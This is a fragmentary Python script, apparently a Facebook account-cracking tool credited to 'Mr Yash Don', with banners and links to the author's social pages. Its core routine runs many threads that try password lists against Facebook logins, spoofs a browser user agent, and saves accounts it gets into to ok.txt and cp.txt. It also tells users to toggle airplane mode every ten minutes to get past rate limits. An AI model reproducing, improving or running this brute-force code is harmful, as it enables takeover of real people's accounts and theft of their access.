...
def logo():
	print ("""
 __     __       _____ _    _       _____   ____  _   _ 
 \ \   / //\    / ____| |  | |     |  __ \ / __ \| \ | |
  \ \_/ //  \  | (___ | |__| |     | |  | | |  | |  \| |
   \   // /\ \  \___ \|  __  |     | |  | | |  | | . ` |•Mr Yash Don
    | |/ ____ \ ____) | |  | |     | |__| | |__| | |\  |
    |_/_/    \_\_____/|_|  |_|     |_____/ \____/|_| \_|  ✓Master Mind🥺❤️                                                  
                                                     
 ───────────────────────────────────────────────────────×
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr yash don\x1b[0m\x1b[1;97m]
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :1\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mr-YASH_DON \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/yashsalina \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./yashsalina7 \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
 """)
...
def notice():
	...
	os.system("xdg-open https://www.facebook.com/groups/1072172426746683/?ref=share")
	...
	os.system("xdg-open https://www.facebook.com/groups/1072172426746683/permalink/1072176363412956/")
	subprocess.check_output(["am", "start", "https://www.facebook.com/yashlovesalina7"])
...
class Main:
 ...
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr Yash Salina\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 1\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mr-Yash Don \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/yashsalina \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./yashlovesalina7\x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
    """)
		...
		subprocess.check_output(["am", "start", "https://youtube.com/channel/UCskfuASaBbDcxgGFwNZRM6A"])
		print("───────────────────────────────────────────────────────× ")
		print("%s [%s1%s]%s CRACK RANDOM FB ID 2008-11 {JUST NOW} %s(Free Trail)"%(G,R,G,Y,B))
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\033[0;92m[=×>]\033[0;92m NOTE : HAR 10 MIN BAD AIRPLANE MOD/FLIGHT MOD ON KRO ")
				print("\033[0;97m───────────────────────────────────────────────────────× ")
				for user in self.id:
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=Y4SH=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=Y4SH=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=Y4SH=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=Y4SH=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue
